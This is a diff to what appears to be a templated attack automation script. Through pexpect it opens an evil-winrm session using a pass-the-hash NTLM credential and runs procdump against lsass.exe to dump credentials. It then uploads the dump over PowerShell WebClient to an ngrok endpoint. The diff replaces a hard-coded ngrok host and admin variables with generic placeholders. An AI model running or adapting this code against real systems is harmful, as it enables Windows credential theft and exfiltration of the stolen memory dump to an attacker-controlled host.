@@ -23,9 +23,9 @@
       import pexpect
       import re
 
-      target_ip = "{{ target_ip_admin }}"
-      username = "{{ admin }}"
-      hash = "{{ ntlm_admin }}"
+      target_ip = "{{ target_ip }}"
+      username = "{{ username }}"
+      hash = "{{ ntlm }}"
 
       command = f"evil-winrm -i {target_ip} -u {username} -H {hash}"
 
@@ -36,7 +36,7 @@
       dump="./procdump.exe -accepteula -ma lsass.exe lsass.dmp"
       ex_1="[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;"
       ex_2="$webClient = New-Object System.Net.WebClient;"
-      ex_3=f"""$webClient.UploadFile("https://a990-82-124-243-12.ngrok-free.app/upload", "POST", "{path}");"""
+      ex_3=f"""$webClient.UploadFile("{{ ngrok_url }}/upload", "POST", "{path}");"""
 
       winrm=f'PS \x1b[0mC:\\Users\\{username}\\Documents> '
       child = pexpect.spawn(command)
